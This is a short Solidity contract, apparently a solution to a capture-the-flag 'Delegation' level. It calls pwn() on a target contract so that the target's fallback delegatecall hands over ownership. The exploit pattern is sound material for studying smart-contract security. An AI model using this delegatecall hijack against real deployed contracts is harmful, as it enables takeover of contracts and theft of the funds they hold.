// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    Delegation public target;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        target = Delegation(_contractAddress);
    }

    function hackContract() external {
        bytes memory function_selector = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(target).call(function_selector);
    }
}
